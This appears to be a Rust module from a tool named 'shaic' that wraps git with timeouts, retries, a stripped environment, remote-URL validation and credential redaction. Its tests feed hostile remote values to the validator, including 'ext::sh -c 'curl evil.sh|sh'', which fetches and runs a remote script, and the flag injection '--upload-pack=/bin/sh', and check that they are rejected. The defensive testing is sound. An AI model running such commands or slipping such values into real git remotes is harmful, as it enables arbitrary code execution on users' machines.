use std::io::Read;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::mpsc::{self, Receiver};
use std::time::{Duration, Instant};

use crate::error::{Error, Result};

/// Local git operations touch nothing but the disk, so anything this slow is
/// a hang, not work in progress.
const DEFAULT_TIMEOUT: Duration = Duration::from_secs(30);

/// Anything that talks to a remote gets far longer: the local budget made
/// cloning a store of any real size fail on a normal connection, which is a
/// worse failure than waiting.
const NETWORK_TIMEOUT: Duration = Duration::from_secs(300);

/// Transient remote failures get a few retries with backoff before surfacing.
const NETWORK_RETRIES: u32 = 3;
const RETRY_BASE_DELAY: Duration = Duration::from_secs(2);

/// The git object id of the empty tree. Diffing against it yields "every line
/// of every tracked file as an addition", which is what makes a first push —
/// with no `origin/<branch>` to compare against — fully scannable.
pub const EMPTY_TREE_OBJECT: &str = "4b825dc642cb6eb9a060e54bf8d69288fbee4904";

/// Passed through to the child process — everything else is stripped so a
/// crafted environment can't smuggle extra behavior into `git`.
const INHERITED_ENV_VARS: &[&str] = &[
    "PATH",
    "HOME",
    "USERPROFILE",
    "HOMEDRIVE",
    "HOMEPATH",
    "APPDATA",
    "LOCALAPPDATA",
    "SYSTEMROOT",
    "COMSPEC",
    "TEMP",
    "TMP",
    "SSH_AUTH_SOCK",
    "SSH_AGENT_PID",
    "USER",
];

/// Reject a remote URL/branch name that could be parsed as a flag instead of
/// a positional argument (e.g. a remote literally named `--upload-pack=...`).
fn reject_flaglike(value: &str, what: &str) -> Result<()> {
    if value.starts_with('-') {
        return Err(Error::InvalidRemote(format!(
            "{what} {value:?} looks like a command-line flag, refusing"
        )));
    }
    Ok(())
}

/// Allowlist the remote URL scheme to https/ssh/git/file (including the
/// scp-like `user@host:path` shorthand, which resolves to ssh, and plain
/// local filesystem paths, which resolve to `file://`). Reject `ext::`/`fd::`
/// transports (arbitrary command execution) and embedded credentials in the
/// URL itself.
pub fn validate_remote_url(url: &str) -> Result<()> {
    reject_flaglike(url, "remote url")?;
    if url.contains("ext::") || url.contains("fd::") {
        return Err(Error::InvalidRemote(format!(
            "remote transport in {url:?} is not allowed (only https, ssh, git, file)"
        )));
    }
    let scp_like = !url.contains("://") && url.contains('@') && url.contains(':');
    let local_path = is_local_filesystem_path(url);
    let scheme_ok = url.starts_with("https://")
        || url.starts_with("ssh://")
        || url.starts_with("git://")
        || url.starts_with("file://")
        || scp_like
        || local_path;
    if !scheme_ok {
        return Err(Error::InvalidRemote(format!(
            "unsupported remote scheme in {url:?} — only https, ssh, git, and local file paths are allowed"
        )));
    }
    if let Some(idx) = url.find("://") {
        let after_scheme = &url[idx + 3..];
        let userinfo = after_scheme.split('@').next().unwrap_or_default();
        if after_scheme.contains('@') && userinfo.contains(':') {
            return Err(Error::InvalidRemote(
                "remote url appears to contain embedded credentials — remove them and rely on a git credential helper".to_string(),
            ));
        }
    }
    Ok(())
}

/// Local clone remotes: Unix `/tmp/repo` and `.`, plus Windows `C:\…` / `C:/…`
/// and UNC `\\server\share`. Drive-letter paths must not be confused with
/// scp-like `user@host:path`.
fn is_local_filesystem_path(url: &str) -> bool {
    if url.contains("://") || url.contains('@') {
        return false;
    }
    if url.starts_with('/') || url.starts_with('.') {
        return true;
    }
    if url.starts_with("\\\\") || url.starts_with("//") {
        return true;
    }
    let bytes = url.as_bytes();
    bytes.len() >= 3
        && bytes[0].is_ascii_alphabetic()
        && bytes[1] == b':'
        && (bytes[2] == b'\\' || bytes[2] == b'/')
}

/// `Command::new("git")` already performs the PATH search — and unlike a
/// hand-rolled one it checks executability, honours the platform's rules, and
/// can't disagree with what the OS would actually exec. `env_clear()` below
/// runs after the program is chosen, so the lookup still uses the real PATH.
fn base_command(cwd: &Path) -> Result<Command> {
    let mut cmd = Command::new("git");
    cmd.current_dir(cwd);
    cmd.env_clear();
    for var in INHERITED_ENV_VARS {
        if let Ok(v) = std::env::var(var) {
            cmd.env(var, v);
        }
    }
    cmd.env("GIT_TERMINAL_PROMPT", "0");
    cmd.env("GIT_ALLOW_PROTOCOL", "https:ssh:git:file");
    cmd.env(
        "GIT_SSH_COMMAND",
        "ssh -o BatchMode=yes -o StrictHostKeyChecking=accept-new",
    );
    Ok(cmd)
}

/// Read a pipe to EOF on its own thread, handing the bytes back over a
/// channel rather than a `JoinHandle`.
///
/// The channel is what makes the timeout in `run` real: joining a reader
/// thread can block forever even after the child is killed, because a
/// grandchild that inherited the pipe (`ssh` behind `git fetch` is the usual
/// one) keeps its write end open. A `Receiver` can be waited on with a
/// deadline and then simply dropped, abandoning the thread instead of the
/// caller.
fn drain_in_background<R: Read + Send + 'static>(mut pipe: R) -> Receiver<Vec<u8>> {
    let (tx, rx) = mpsc::channel();
    std::thread::spawn(move || {
        let mut buf = Vec::new();
        let _ = pipe.read_to_end(&mut buf);
        let _ = tx.send(buf);
    });
    rx
}

/// Run a git command with a timeout, draining stdout/stderr concurrently so a
/// chatty command can't deadlock on a full pipe buffer while we wait.
fn run(mut cmd: Command, timeout: Duration) -> Result<std::process::Output> {
    let mut child = cmd
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|source| Error::Git(format!("could not run git: {source}")))?;

    let stdout_rx = child
        .stdout
        .take()
        .map(drain_in_background)
        .ok_or_else(|| Error::Git("git stdout pipe was not created".to_string()))?;
    let stderr_rx = child
        .stderr
        .take()
        .map(drain_in_background)
        .ok_or_else(|| Error::Git("git stderr pipe was not created".to_string()))?;

    let start = Instant::now();
    let status = loop {
        if let Some(status) = child.try_wait().map_err(|source| Error::Io {
            path: PathBuf::new(),
            source,
        })? {
            break status;
        }
        if start.elapsed() > timeout {
            let _ = child.kill();
            let _ = child.wait();
            // Return without touching the readers: they may still be parked on
            // a pipe some grandchild holds open, and waiting on them here is
            // exactly the hang the timeout exists to prevent.
            return Err(Error::Git("git command timed out".to_string()));
        }
        std::thread::sleep(Duration::from_millis(25));
    };

    // The child is gone, so its output is complete and about to arrive. Wait
    // with a deadline anyway (a lingering grandchild can still hold the pipe),
    // and treat a miss as a failure rather than returning short output —
    // `push` scans this text for credentials, and silently truncating it would
    // turn a leak into a pass.
    let stdout = collect(&stdout_rx, timeout, "stdout")?;
    let stderr = collect(&stderr_rx, timeout, "stderr")?;
    Ok(std::process::Output {
        status,
        stdout,
        stderr,
    })
}

fn collect(rx: &Receiver<Vec<u8>>, timeout: Duration, what: &str) -> Result<Vec<u8>> {
    rx.recv_timeout(timeout)
        .map_err(|_| Error::Git(format!("git {what} could not be read to completion")))
}

fn run_git(cwd: &Path, args: &[&str]) -> Result<String> {
    run_git_within(cwd, args, DEFAULT_TIMEOUT)
}

fn run_git_within(cwd: &Path, args: &[&str], timeout: Duration) -> Result<String> {
    let output = run_git_raw(cwd, args, timeout)?;
    if !output.status.success() {
        return Err(Error::Git(format!(
            "git {} failed: {}",
            args.join(" "),
            String::from_utf8_lossy(&output.stderr).trim()
        )));
    }
    Ok(String::from_utf8_lossy(&output.stdout).into_owned())
}

/// Like `run_git_within`, but retries a few times on transient network errors.
fn run_git_within_retry(cwd: &Path, args: &[&str], timeout: Duration) -> Result<String> {
    let mut last_err: Option<Error> = None;
    for attempt in 0..NETWORK_RETRIES {
        match run_git_within(cwd, args, timeout) {
            Ok(out) => return Ok(out),
            Err(Error::Git(msg)) if is_transient_git_failure(&msg) => {
                last_err = Some(Error::Git(msg));
                if attempt + 1 < NETWORK_RETRIES {
                    let delay = RETRY_BASE_DELAY * (1 << attempt);
                    eprintln!(
                        "shaic: git {} failed (attempt {}/{NETWORK_RETRIES}), retrying in {}s…",
                        args.join(" "),
                        attempt + 1,
                        delay.as_secs()
                    );
                    std::thread::sleep(delay);
                }
            }
            Err(err) => return Err(err),
        }
    }
    Err(last_err.unwrap_or_else(|| {
        Error::Git(format!(
            "git {} failed after {NETWORK_RETRIES} attempts",
            args.join(" ")
        ))
    }))
}

fn is_transient_git_failure(message: &str) -> bool {
    let s = message.to_lowercase();
    s.contains("timed out")
        || s.contains("could not resolve host")
        || s.contains("connection timed out")
        || s.contains("connection reset")
        || s.contains("failed to connect")
        || s.contains("unable to access")
        || s.contains("network is unreachable")
        || s.contains("temporary failure")
        || s.contains("the remote end hung up")
        || s.contains("early eof")
        || s.contains("rpc failed")
        || s.contains("error: 502")
        || s.contains("error: 503")
        || s.contains("error: 504")
        || s.contains("service unavailable")
        || s.contains("bad gateway")
}

/// Run git and hand back the raw exit status, for the few commands where a
/// specific non-zero exit is an *answer* rather than a failure.
fn run_git_raw(cwd: &Path, args: &[&str], timeout: Duration) -> Result<std::process::Output> {
    let mut cmd = base_command(cwd)?;
    cmd.args(args);
    run(cmd, timeout)
}

pub fn init(root: &Path) -> Result<()> {
    run_git(root, &["init"])?;
    // Store markdown is LF in git; avoid Windows checkout rewriting `---`
    // frontmatter into CRLF that older parsers rejected.
    run_git(root, &["config", "core.autocrlf", "false"])?;
    Ok(())
}

pub fn clone(url: &str, dest: &Path) -> Result<()> {
    validate_remote_url(url)?;
    let parent = dest.parent().unwrap_or(Path::new("."));
    std::fs::create_dir_all(parent).map_err(|source| Error::Io {
        path: parent.to_path_buf(),
        source,
    })?;
    let dest_str = dest.to_string_lossy().into_owned();
    // Force LF in the working tree for this clone so frontmatter survives on
    // Windows runners with a global `core.autocrlf=true`.
    run_git_within_retry(
        parent,
        &["-c", "core.autocrlf=false", "clone", "--", url, &dest_str],
        NETWORK_TIMEOUT,
    )?;
    run_git(dest, &["config", "core.autocrlf", "false"])?;
    Ok(())
}

pub fn set_remote(root: &Path, url: &str) -> Result<()> {
    validate_remote_url(url)?;
    if run_git(root, &["remote", "get-url", "origin"]).is_ok() {
        run_git(root, &["remote", "set-url", "origin", "--", url])?;
    } else {
        run_git(root, &["remote", "add", "origin", "--", url])?;
    }
    Ok(())
}

/// Non-destructive reachability check, used by the setup wizard/doctor before
/// committing to clone/init.
pub fn ls_remote(url: &str) -> Result<()> {
    validate_remote_url(url)?;
    run_git_within_retry(Path::new("."), &["ls-remote", "--", url], NETWORK_TIMEOUT)?;
    Ok(())
}

pub fn current_branch(root: &Path) -> Result<String> {
    let out = run_git(root, &["rev-parse", "--abbrev-ref", "HEAD"])?;
    Ok(out.trim().to_string())
}

pub fn status_porcelain(root: &Path) -> Result<String> {
    run_git(root, &["status", "--porcelain"])
}

pub fn add_all(root: &Path) -> Result<()> {
    run_git(root, &["add", "-A"])?;
    Ok(())
}

pub fn diff_cached(root: &Path) -> Result<String> {
    run_git(root, &["diff", "--cached"])
}

pub fn diff_cached_stat(root: &Path) -> Result<String> {
    run_git(root, &["diff", "--cached", "--stat"])
}

/// Unstage everything, leaving the working tree untouched — used to undo the
/// `add -A` that precedes the push-time secret scan, so a rejected credential
/// isn't left sitting in the index for the next commit to pick up.
pub fn reset_mixed(root: &Path) -> Result<()> {
    if rev_parse(root, "HEAD").is_ok() {
        run_git(root, &["reset", "-q", "--mixed"])?;
    } else {
        // Nothing committed yet, so there's no HEAD to reset *to*; emptying
        // the index reaches the same "nothing is staged" state.
        run_git(root, &["read-tree", "--empty"])?;
    }
    Ok(())
}

pub fn commit(root: &Path, message: &str) -> Result<()> {
    run_git(root, &["commit", "-m", message])?;
    Ok(())
}

pub fn fetch(root: &Path) -> Result<()> {
    run_git_within_retry(root, &["fetch", "origin"], NETWORK_TIMEOUT)?;
    Ok(())
}

/// Whether the store's git repo has an `origin` remote configured — checked
/// before any `fetch`/`push`, which otherwise fail with a raw, unfriendly
/// git error (`fatal: 'origin' does not appear to be a git repository`) on a
/// store that was `init`ed without `--remote`.
pub fn has_remote(root: &Path) -> bool {
    origin_url(root).is_ok()
}

/// Current `origin` URL, if one is configured.
pub fn origin_url(root: &Path) -> Result<String> {
    let out = run_git(root, &["remote", "get-url", "origin"])?;
    Ok(out.trim().to_string())
}

/// Strip `user:password@` from a URL so a pasted credential never lands in
/// a TUI status line or `shaic doctor` output. Query-string tokens are left
/// alone — they're not a well-defined shape and over-redacting would hide
/// the host the user actually needs to read.
pub fn redact_userinfo(url: &str) -> String {
    let Some(scheme_end) = url.find("://") else {
        return url.to_string();
    };
    let after = &url[scheme_end + 3..];
    let Some(at) = after.find('@') else {
        return url.to_string();
    };
    let userinfo = &after[..at];
    if !userinfo.contains(':') {
        return url.to_string();
    }
    format!("{}://***@{}", &url[..scheme_end], &after[at + 1..])
}

/// Whether `origin/<branch>` exists yet — false for a brand new remote with
/// no commits, which is a normal "nothing to merge yet" state, not a
/// divergence.
pub fn remote_branch_exists(root: &Path, branch: &str) -> Result<bool> {
    reject_flaglike(branch, "branch")?;
    let target = format!("refs/remotes/origin/{branch}");
    Ok(run_git(root, &["rev-parse", "--verify", "--quiet", &target]).is_ok())
}

/// Whether `ancestor` is an ancestor of `descendant`.
///
/// `merge-base --is-ancestor` answers with its exit code — `1` means "no",
/// which is a result, not a failure. Anything else really is one.
fn is_ancestor(root: &Path, ancestor: &str, descendant: &str) -> Result<bool> {
    let output = run_git_raw(
        root,
        &["merge-base", "--is-ancestor", ancestor, descendant],
        DEFAULT_TIMEOUT,
    )?;
    match output.status.code() {
        Some(0) => Ok(true),
        Some(1) => Ok(false),
        _ => Err(Error::Git(format!(
            "git merge-base --is-ancestor {ancestor} {descendant} failed: {}",
            String::from_utf8_lossy(&output.stderr).trim()
        ))),
    }
}

/// Fast-forward-only merge. A genuine divergence is reported as
/// `Error::Diverged` — shaic never attempts a real merge/rebase, and the user
/// is pointed at plain git in the store directory. Any other failure (disk
/// full, corrupt object store, ...) keeps its real message instead of being
/// masked as divergence.
///
/// Divergence is decided from the commit graph, not from git's wording: the
/// previous version matched the string "fast-forward" in stderr, which is
/// whatever the user's git version and locale happen to print — under a
/// non-English locale every ordinary merge failure was reported as a
/// divergence, and a future rewording would report none at all.
pub fn merge_ff_only(root: &Path, branch: &str) -> Result<()> {
    reject_flaglike(branch, "branch")?;
    let target = format!("origin/{branch}");
    // An unborn HEAD (fresh `init`, nothing committed) has no commit to
    // compare with, so leave the decision to git itself.
    if rev_parse(root, "HEAD").is_ok() {
        // Local already contains origin's tip: ahead, or identical. Either way
        // there is nothing to fast-forward, and `--ff-only` would only mean
        // "already up to date".
        if is_ancestor(root, &target, "HEAD")? {
            return Ok(());
        }
        if !is_ancestor(root, "HEAD", &target)? {
            return Err(Error::Diverged {
                store: root.to_path_buf(),
            });
        }
    }
    run_git(root, &["merge", "--ff-only", &target])?;
    Ok(())
}

pub fn push(root: &Path, branch: &str) -> Result<()> {
    reject_flaglike(branch, "branch")?;
    run_git_within_retry(root, &["push", "origin", "--", branch], NETWORK_TIMEOUT)?;
    Ok(())
}

/// What HEAD has to be diffed against to see everything a push would publish.
///
/// With no `origin/<branch>` on the remote, *all* of local history is
/// outgoing, so the empty tree is the only honest base — otherwise the first
/// push, the one most likely to carry a credential committed before shaic was
/// ever involved, would be the one push nothing scanned.
pub fn outgoing_base(branch: &str, remote_branch_exists: bool) -> String {
    if remote_branch_exists {
        format!("origin/{branch}")
    } else {
        EMPTY_TREE_OBJECT.to_string()
    }
}

/// The patch between two revisions (or trees), as opposed to `diff_stat`'s
/// summary — the push-time secret scan needs the content, not the file names.
pub fn diff_range(root: &Path, from_rev: &str, to_rev: &str) -> Result<String> {
    reject_flaglike(from_rev, "revision")?;
    reject_flaglike(to_rev, "revision")?;
    let range = format!("{from_rev}..{to_rev}");
    run_git(root, &["diff", &range])
}

/// How many local commits are not on `origin/<branch>` yet. Returns `0` when
/// the remote branch does not exist (caller decides whether a first push is
/// still needed).
pub fn commits_ahead(root: &Path, branch: &str) -> Result<usize> {
    reject_flaglike(branch, "branch")?;
    if !remote_branch_exists(root, branch)? {
        return Ok(0);
    }
    let range = format!("origin/{branch}..HEAD");
    let out = run_git(root, &["rev-list", "--count", &range])?;
    Ok(out.trim().parse().unwrap_or(0))
}

/// Local commit count on HEAD — used when `origin/<branch>` does not exist
/// yet so a clean working tree can still mean "unpushed history".
pub fn commit_count_head(root: &Path) -> Result<usize> {
    let out = run_git(root, &["rev-list", "--count", "HEAD"])?;
    Ok(out.trim().parse().unwrap_or(0))
}

pub fn diff_stat(root: &Path, from_rev: &str, to_rev: &str) -> Result<String> {
    let range = format!("{from_rev}..{to_rev}");
    run_git(root, &["diff", "--stat", &range])
}

pub fn rev_parse(root: &Path, rev: &str) -> Result<String> {
    let out = run_git(root, &["rev-parse", rev])?;
    Ok(out.trim().to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn rejects_ext_transport() {
        assert!(validate_remote_url("ext::sh -c 'curl evil.sh|sh'").is_err());
    }

    #[test]
    fn rejects_fd_transport() {
        // Same class of arbitrary-command/descriptor smuggling as `ext::`,
        // and just as much a remote "url" as far as git is concerned.
        assert!(matches!(
            validate_remote_url("fd::7,8"),
            Err(Error::InvalidRemote(_))
        ));
        assert!(matches!(
            validate_remote_url("https://example.com/fd::7"),
            Err(Error::InvalidRemote(_))
        ));
    }

    #[test]
    fn a_timeout_returns_even_when_a_grandchild_holds_the_pipe_open() {
        // The shape `git fetch` takes when ssh hangs: the child is killed on
        // time, but a grandchild it spawned still owns the write end of the
        // pipe. Joining the reader threads here used to block the caller for
        // as long as *that* process lived, defeating the timeout entirely.
        let mut cmd = Command::new("sh");
        cmd.args(["-c", "sleep 5 & sleep 5"]);
        let start = Instant::now();
        let result = run(cmd, Duration::from_millis(200));
        assert!(result.is_err(), "expected the timeout to fire");
        assert!(
            start.elapsed() < Duration::from_secs(3),
            "run() waited on the grandchild instead of returning: {:?}",
            start.elapsed()
        );
    }

    #[test]
    fn outgoing_base_falls_back_to_the_empty_tree() {
        assert_eq!(outgoing_base("main", true), "origin/main");
        assert_eq!(outgoing_base("main", false), EMPTY_TREE_OBJECT);
    }

    #[test]
    fn rejects_flag_like_url() {
        assert!(validate_remote_url("--upload-pack=/bin/sh").is_err());
    }

    #[test]
    fn rejects_embedded_credentials() {
        assert!(validate_remote_url("https://user:token@github.com/x/y.git").is_err());
    }

    #[test]
    fn redact_userinfo_hides_password_keeps_host() {
        assert_eq!(
            redact_userinfo("https://user:token@github.com/x/y.git"),
            "https://***@github.com/x/y.git"
        );
        assert_eq!(
            redact_userinfo("https://github.com/x/y.git"),
            "https://github.com/x/y.git"
        );
        assert_eq!(
            redact_userinfo("git@github.com:x/y.git"),
            "git@github.com:x/y.git"
        );
    }

    #[test]
    fn accepts_https_and_ssh_and_scp_like() {
        assert!(validate_remote_url("https://github.com/x/y.git").is_ok());
        assert!(validate_remote_url("ssh://git@github.com/x/y.git").is_ok());
        assert!(validate_remote_url("git@github.com:x/y.git").is_ok());
    }

    #[test]
    fn accepts_local_file_paths() {
        assert!(validate_remote_url("/tmp/some-bare-repo").is_ok());
        assert!(validate_remote_url("file:///tmp/some-bare-repo").is_ok());
        assert!(validate_remote_url(r"C:\Users\runner\AppData\Local\Temp\repo").is_ok());
        assert!(validate_remote_url("C:/Users/runner/AppData/Local/Temp/repo").is_ok());
        assert!(validate_remote_url(r"\\server\share\repo").is_ok());
    }

    #[test]
    fn rejects_flaglike_branch() {
        assert!(reject_flaglike("--force", "branch").is_err());
    }

    #[test]
    fn transient_git_failures_are_detected() {
        assert!(is_transient_git_failure(
            "fatal: unable to access 'https://github.com/x/y.git/': Could not resolve host: github.com"
        ));
        assert!(is_transient_git_failure("git command timed out"));
        assert!(!is_transient_git_failure(
            "git push origin -- main failed: ! [rejected] main -> main (fetch first)"
        ));
    }
}
